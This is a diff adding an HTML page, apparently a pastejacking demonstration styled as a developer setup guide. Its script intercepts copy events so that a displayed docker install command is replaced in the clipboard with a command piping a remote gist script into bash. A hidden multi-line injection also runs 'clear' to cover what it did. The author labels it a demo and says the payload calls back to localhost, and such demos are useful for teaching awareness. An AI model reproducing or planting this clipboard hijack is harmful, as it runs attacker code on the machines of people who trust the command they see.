@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Pastejacking Demo</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+<div class="page">
+  <header>
+    <div class="site-tag">// devdocs · hacker quickstart</div>
+    <h1>Environment "Setup" Guide</h1>
+    <p class="subtitle">Follow the steps below to "configure" your local development environment.</p>
+    <a class="back-btn" href="https://doctoreww.github.io/EvilFontTool/">View Other Demos!</a>
+
+  </header>
+
+  <div class="step">
+    <div class="step-label">Step 01</div>
+    <h2>Install docker</h2>
+        <p>Yes, the displayed command is actually a way to install docker. No, I dont think its a good idea. Yes, I use it sometimes when I'm feeling lazy. No, this payload wont rekt you it calls back to localhost. Yes, you could have a much better URL than I use and you could call the docker curl as part of your payload. </p>
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">bash</span>
+      </div>
+      <code data-injected="curl -fsSL https://gist.githubusercontent.com/DoctorEww/284378b0ab4f1fa36a64f75e6a9537aa/raw/00b0107f8199f7448915ef75cbcbc0c759a1d2da/pip.txt | bash">curl -fsSL https://get.docker.com/ | sh</code>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-label">Step 02</div>
+    <h2>Go to this website</h2>
+    <p>You could use this attack to get people to think they are going to a good place...</p>
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">bash</span>
+      </div>
+      <code data-injected="https://yahoo.com">http://google.com</code>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-label">Step 03</div>
+    <h2>Run this in pwsh on linux</h2>
+    <p>Not every terminal is nice about pasting multi line commands. Powershell on linux is very nice to the hackers.</p>
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">pwsh</span>
+      </div>
+      <code data-injected="echo hi\nclear\nwhoami\n">whoami</code>
+    </div>
+  </div>
+</div>
+
+
+
+
+
+<script>
+  function parsePayload(str) {
+    return str.replace(/\\n/g, '\n');
+  }
+  // Intercept manual text selection + Ctrl+C as well
+  document.addEventListener('copy', e => {
+    const node = window.getSelection()?.anchorNode?.parentElement?.closest('code'); // find if we're inside a <code> block
+    if (node && node.dataset.injected) {
+      e.preventDefault(); // cancel the normal copy so real text never reaches clipboard
+      e.clipboardData.setData('text/plain',  parsePayload(node.dataset.injected)); // silently inject our payload
+    }
+  });
+</script>
+
+</body>
+</html>
